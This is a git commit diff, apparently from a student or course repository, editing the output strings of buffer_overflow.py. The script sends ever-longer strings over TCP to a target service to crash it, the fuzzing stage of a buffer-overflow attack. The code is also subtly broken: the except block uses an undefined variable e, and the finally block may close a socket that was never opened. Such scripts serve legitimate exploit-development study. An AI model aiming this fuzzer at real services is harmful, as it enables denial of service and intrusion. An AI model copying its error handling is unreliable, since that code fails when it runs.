cf785e5c3dfc2777a536f4551271a0c948a6f833
Sabrina Lawrence <sklawren@usc.edu>
2023-10-25 14:43:21 -0700

    Update buffer_overflow.py
    edit string outputs

--- buffer_overflow.py
+++ buffer_overflow.py
@@ -11,14 +11,14 @@ while len(buffer) <= 10:
     counter += 100
 try:
     for string in buffer:
-        print(f'[+] Sending {len(string)} bytes...')
+        print(f'Sending {len(string)} bytes...')
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip,target_port))
         s.recv(1024)
         s.send((string + '\r\n').encode())
-        print ('[+] Done')
+        print ('Bytes sent.')
 except:
-    print(f'[!] Unable to connect to the application. Reason: {e}. You may have crashed it.')
+    print(f'Unable to connect to the application. Reason: {e}.')
     sys.exit(0)
 finally:
 	s.close()
